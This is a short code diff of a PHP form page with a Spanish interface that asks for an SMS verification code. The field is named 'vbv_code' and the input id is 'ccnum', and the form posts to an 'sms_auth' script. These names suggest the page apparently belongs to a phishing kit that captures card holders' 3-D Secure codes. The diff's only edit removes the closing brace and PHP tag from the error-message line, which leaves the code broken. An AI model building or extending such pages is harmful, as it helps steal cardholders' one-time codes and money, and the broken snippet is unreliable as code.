@@ -127,7 +127,7 @@ if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true && isset($_
         <div class="container-fluid">
             <form method="post" action="../actions/sms_auth.php">
                 <div class="row">
-                    <?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p class="error-message">Código inválido o caducado, por favor compruébelo</p>'; }?>
+                    <?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p class="error-message">Código inválido o caducado, por favor compruébelo</p>';
                     <div class="col-sm-8">
                         <label class="mandatory">Código recibido por SMS</label>
                         <input id="ccnum" type="text" name="vbv_code" class="form-control" minlength="6" maxlength="10" inputmode="numeric" oninput="chiffres_only(this)">
